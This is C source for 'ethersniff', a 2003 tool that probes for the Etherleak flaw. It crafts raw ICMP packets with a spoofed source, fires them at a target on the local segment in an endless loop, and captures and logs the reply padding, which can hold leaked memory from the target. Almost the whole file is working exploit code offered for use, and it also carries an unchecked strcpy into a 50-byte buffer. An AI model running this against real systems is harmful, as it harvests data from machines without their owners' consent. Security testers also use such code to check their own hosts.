/***************************************************************************
                          ethersniff.c  -  Etherleak probing tool
                             -------------------
    begin                : St kvì 7 2003
    copyright            : (C) 2003 by Michael Komm
    email                : michael.komm@centrum.cz
 ***************************************************************************/

/***************************************************************************
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   (at your option) any later version.                                   *
 *                                                                         *
 ***************************************************************************/
/*
  The target machine has to be on the same network segment to receive
  ethernet frames (and you have to be r00t)!

  Full info on the Ethernet frame padding information leakage
  www.atstake.com/research/advisories/ 2003/atstake_etherleak_report.pdf

 sorry for the nasty coding, I'm a C newbie :>

 Some code ripped from ICMPSpewf v1 by Max0r
          and ishell by Peter Kieltyka (elux)
            -  Thanx guys :)

*/
//to compile: gcc -lpcap -lpthread -o ethersniff ethersniff.c

#include <stdio.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include <sys/types.h>
#include <asm/types.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <fcntl.h>
#include <netdb.h>
#include <pcap.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>



#define SEQ 20985
#define MAX_DATA 100

//some globals

int delay,type,data_len;
unsigned char dump_file[50];
unsigned char data[MAX_DATA];
	unsigned int source,target;
int verbose, mode;
//mode - 0 is normal, 1 is just send and -1 is just listen
struct  sockaddr_in sin_addr;
struct  hostent *he;
char *dest;
unsigned char errbuf[65400];
unsigned char user[65400];
pcap_t *dev;
pthread_t listener;
FILE *dump;
/*IP header struct */
struct ip_hdr {
 u_int   ip_hl:4,
         ip_v: 4;
u_char   ip_tos;
u_short  ip_len;
u_short  ip_id;
u_short  ip_off;
u_char   ip_ttl;
u_char   ip_p;
u_short  ip_sum;
u_long   saddr, daddr;
} ip_head;
/*ICMP header struct */
    struct icmp_hdr {
	u_char		type;
	u_char		code;
	u_long		checksum;

} icmp_head;

void print_logo () {
printf("\033[33m");
printf("      _____  _______   _   _   ____   ___      ___   _    _   ___    ____   ____ \n");
printf("     |  __| |__   __| | | | | |  __| |   \\    / __/ | \\  | | |   |  |  __| |  __|\n");
printf("     | |_      | |    | |_| | | |_   | |) )  ( |__  | \\\\ | |  | |   | |_   | |_  \n");
printf("     |  _|     | |    |  _  | |  _|  |   /    \\__ \\ | |\\\\| |  | |   |  _|  |  _| \n");
printf("     | |__     | |    | | | | | |__  | |\\ \\    __/ )| | \\\\ |  | |   | |    | |   \n");
printf("     |____|    |_|    |_| |_| |____| |_| \\_\\  |___/ |_|  \\_| |___|  |_|    |_|   \033[0m\n");



}

/*---------------IP Checksum Calculation Routine----------------- */

unsigned short in_cksum(unsigned short *addr, int len)
{
  register int nleft = len;
  register unsigned short *w = addr;
  register int sum = 0;
  unsigned short answer = 0;

  while (nleft > 1)
	{
	sum += *w++;
	nleft -= 2;
	}
  if (nleft == 1)
	{
	*(u_char *)(&answer) = *(u_char *)w;
	sum += answer;
	}
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return(answer);
}

void usage(char *s) {
	fprintf(stderr,"\nEthersniff - Etherleak probing tool \n");
	fprintf(stderr,"\nCoded by Michael Komm (Robin) \n");
	fprintf(stderr,"usage: %s [-t type] [-d delay] [-vhsl] [-f file] <source> <destination>\n", s);
	fprintf(stderr,"       -t ICMP type of our packets (default 0)\n");
	fprintf(stderr,"       -d delay between shots (default 1s)\n");
	fprintf(stderr,"       -f dump file (default ethernsniff.dump)\n");
	fprintf(stderr,"       -v verbose mode\n");
	fprintf(stderr,"       -s just send packets\n");
	fprintf(stderr,"       -l just listen for them\n");
	fprintf(stderr,"       -h display this message\n");
exit(0);
	}



/* ----------------end ripped checksum code------------*/

/*
Does what it saids - sends an ICMP packet of given type through a raw socket sfd
with specified source and destination address with payload in buffer
returns the sendto value
*/
int send_packet(int sfd, unsigned int src,unsigned int dst,
                 unsigned long seq,unsigned char *buffer, int len, int type)
{
    struct sockaddr_in target;
    char packet[2048];
    int i;

   /* Filling the IP Header */

   ip_head.ip_hl		= 5;
   ip_head.ip_v			= 4;
   ip_head.ip_tos		= 0;
   ip_head.ip_len		= sizeof(struct iphdr)+sizeof(struct icmphdr)+len*sizeof(unsigned char);
   ip_head.ip_id		= htonl(31337 + (rand()%100));
   ip_head.ip_off		= 0;
   ip_head.ip_ttl		= 255;
   ip_head.ip_p			= IPPROTO_ICMP;
   ip_head.saddr		= src;
   ip_head.daddr		= dst;
   ip_head.ip_sum		= 0;
   ip_head.ip_sum		= in_cksum((unsigned short *)&ip_head, sizeof(struct iphdr));

   /* Filling the ICMP HEADER */
   icmp_head.type		= type;
   icmp_head.code		= 0;
   icmp_head.checksum		=0;
   icmp_head.checksum	= in_cksum((unsigned short *)&icmp_head, sizeof(struct icmphdr));

   /* PACKET ASSEMBLY */

   //first come the IP header
   memcpy(packet,(char *)&ip_head, sizeof(ip_head));
   //followed by the ICMP header
   memcpy(packet+sizeof(ip_head), (char *)&icmp_head, sizeof(icmp_head));
   //and the payload
   memcpy(packet+sizeof(ip_head)+sizeof(icmp_head), buffer, len);


   /* let's send it out */

   target.sin_family		= AF_INET;
   target.sin_addr.s_addr	= ip_head.daddr;

   i = sendto(sfd, packet, sizeof(struct iphdr)+sizeof(struct icmphdr)+len,
                             0,(struct sockaddr *)&target, sizeof(struct sockaddr_in));
   if (i < 0) {
       perror("sendto()");
   }
   return(i);

}

/* End-point for the pcap_loop
   Checks the packet, if it has proper length it prints the payload
   and logs it in a file

*/
void show_packet(unsigned char *user, struct pcap_pkthdr *ph, u_char *buf) {
int i;
unsigned char ethernet_hdr [16];
//we have to choose between our packets and the other stuff
//let's suppose our packets are ICMP packets from the dest address (according to RFC)
struct ip_hdr incoming_ip;
struct icmp_hdr incoming_icmp;
 memcpy((char *)&incoming_ip,buf+sizeof(ethernet_hdr), sizeof(incoming_ip));
   //followed by the ICMP header
   memcpy((char *)&incoming_icmp,buf+sizeof(incoming_ip)+sizeof(ethernet_hdr), sizeof(incoming_icmp));
//check for the right packet
if ((incoming_ip.saddr == target) && (incoming_ip.ip_p == IPPROTO_ICMP)) {
if (verbose == 1) {
    printf("Packet matched (%d): ",ph->len);
}
//open the dump file
if ((dump = fopen(dump_file,"a+")) == NULL) {
printf("[-] Cannot open dump file!\n");

}
     for (i=0;i< 28;i++) {
 //the dump file will store the whole packet
        fprintf(dump,"%c",buf[i]);
}
    for (i=28;i< ph->len;i++) {
          if ((buf[i] > 33)&&(buf[i] < 126))  {
          printf("%c",buf[i]);
           } else {
          printf(".");
           }
 fprintf(dump,"%c",buf[i]);

    }
    printf("\n");
fprintf(dump,"\n");
fclose(dump);
}

}
void *listen_loop (void *data) {
int n;
if ((dev =  pcap_open_live(NULL,100000,0,1,errbuf)) == NULL) {
printf("[-] Cannot open pcap: %s\n",errbuf);
exit(1);
}
if (verbose== 1) {
printf("OK\n");
}
n = pcap_loop(dev,-1,show_packet,user);
printf("[-] %d Packets received, exiting\n",n);

}
void main(int argc, char **argv)
{
	extern char *optarg;
	extern int optind;
	int i, opt,n, type;
print_logo();	
	if(argc < 3)
	{
	  usage(argv[0]);

	}
//defaults
type = 8;
delay = 1;
data[0] = 0x62;
data_len = 0;
sprintf(dump_file,"ethersniff.dump");
verbose = 0;
mode = 0;

 while ((opt = getopt(argc, argv, "f:t:d:vsl")) != EOF)
  {
  switch(opt){
   case 't':
    type = atoi(optarg);
    break;
   case 'd':
    delay = atoi(optarg);
    break;
   case 'v':
    verbose = 1;
    break;
   case 's':
    mode = 1;
    break;
   case 'l':
    mode = -1;
    break;
   case 'f':
    strcpy(dump_file,optarg);
    break;
   case 'h':
    usage(argv[1]);
    break;

   default:
  usage(argv[1]);

  }
  }	


source = inet_addr(argv[argc -2]);
target = inet_addr(argv[argc - 1]);
dest = argv[argc -1];
 if((he = gethostbyname(dest)) == NULL) {
        fprintf(stderr, "[-] Cannot resolve %s!\n", dest);
        exit(-1);
    }

    sin_addr.sin_family = AF_INET;
    sin_addr.sin_addr = *((struct in_addr *)he->h_addr);
    memset(&(sin_addr.sin_zero), 0, 8);
if (verbose == 1) {
    printf("[+] Packets of type %d: %s -> %s will be sent\n",type,argv[argc -2],argv[argc -1]);
}
	if((i = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		   perror("[-] socket()");
      exit(1);
		}

{                             /* lets do it the ugly way.. */
    int one = 1;
    const int *val = &one;
    if (setsockopt (i, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
      printf ("[-] Cannot set HDRINCL!\n");
      exit(1);
       }
  }
//opening the capture thread
if (mode < 1) {
    if (verbose == 1) {
        printf("[+] Starting Pcap loop...");
    }
}
    pthread_create(&listener,NULL,listen_loop,NULL);
if ((verbose == 1) && (mode > -1)) {
    printf("[+] Starting ping loop, delay will be %d s\n",delay);
}

//main and etternal loop
while(1) {
    if (mode > -1) {
        if (verbose) {
            printf("Fire...");
        }
        n = send_packet(i, source, target, SEQ,data,data_len, type);
       if (n < 0) {
           printf("target missed, something's wrong!!!\n");
       } else {
          if (verbose == 1) {
              printf("OK\n");
          }
       }
    }
    sleep(delay);

}
//we shouldn't get here
	close(i);
}
